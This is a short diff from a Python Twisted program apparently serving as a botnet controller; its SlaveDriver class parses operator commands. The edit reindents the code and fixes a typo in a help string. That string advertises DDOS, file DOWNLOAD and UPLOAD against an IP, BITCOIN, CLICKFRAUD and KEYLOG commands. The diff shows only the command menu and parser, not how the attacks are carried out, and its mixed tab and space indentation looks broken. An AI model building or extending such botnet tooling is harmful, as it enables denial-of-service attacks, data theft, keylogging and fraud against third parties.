@@ -104,12 +104,12 @@ class SlaveDriver(basic.LineReceiver):
     	#parse out actual command
     	tmp = line.split(' ')
     	cmd = tmp[0].upper()
-    	if cmd not in commands:
+        if cmd not in commands:
     		#output to input
-    		self.transport.write('Invalid Command\n')
-    		self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], BITCOING [username] [password], CLICKFRAUD [webaddress] [HTMLobjectname], KEYLOG\n')
-    	else:
-    		self.commands += 1
+    	   self.transport.write('Invalid Command\n')
+    	   self.transport.write('Valid commands are: DDOS [ip], DOWNLOAD [ip] [port] [filepath], UPLOAD [ip] [port] [filepath], BITCOIN [username] [password], CLICKFRAUD [webaddress] [HTMLobjectname], KEYLOG\n')
+        else:
+            self.commands += 1
             self.parsecommands(line) #pass line for instructions that have more than one argument
 
 if len(sys.argv) != 4:
